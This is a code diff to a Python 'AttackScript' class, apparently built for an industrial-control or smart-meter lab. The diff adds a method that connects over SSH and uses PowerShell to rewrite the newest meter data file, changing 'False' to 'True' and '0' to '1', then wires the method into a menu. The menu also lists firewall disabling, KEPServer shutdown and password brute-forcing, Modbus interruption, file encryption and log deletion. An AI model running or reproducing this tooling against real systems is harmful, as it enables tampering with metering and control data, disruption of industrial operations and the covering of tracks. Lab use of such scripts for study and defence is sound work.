@@ -24,6 +24,7 @@ import paramiko
 from scp import SCPClient
 import socket
 import platform
+import subprocess
 
 
 class AttackScript:
@@ -133,7 +134,7 @@ class AttackScript:
             return None
         ssh.close()
         # Return the output
-        return ssh_output
+        return ssh_output, ssh_stderr
 
     def scheduled_task_delete_files(self, folder_path) -> None:
         """
@@ -1763,6 +1764,22 @@ class AttackScript:
         for log_file in log_files_to_delete:
             self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
 
+    def ChangeDataValueSendBack(self):
+
+        #Get File Path
+        command_output , stderr= self.ssh_run_command("pwsh.exe -Command \"(Get-ChildItem -Path \"C:\\Users\\Student\\Documents\\SmartMeterData\\Meter2\" | Sort-Object -Property LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName)")
+        print([command_output[:-1]])
+        #print(stderr)
+
+        # Command to replace 'False' with 'True' in the file
+        command_replace_false , stderr= self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace 'False', 'True' | Set-Content -Path \"{command_output[:-1]}\"")
+        print("Replaced False with with True")
+        #print(stderr)
+
+        # Replace '0' with '1' in the file
+        command_replace_zero , stderr= self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
+        print("Replaced 0 with 1")
+
     ########
     # MAIN #
     ########
@@ -1835,6 +1852,8 @@ class AttackScript:
                 self.setup_ssh_config_and_key()  # Move this up to be with the other ssh functions
             case "28":
                 self.kep_delete_log_files()
+            case "29":
+                self.ChangeDataValueSendBack()
             case "-h":
                 print(
                     "\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
@@ -1843,5 +1862,5 @@ class AttackScript:
 
 
 if __name__ == '__main__':
-    attack = AttackScript("172.16.2.223")
+    attack = AttackScript("172.16.2.77")
     attack.main()
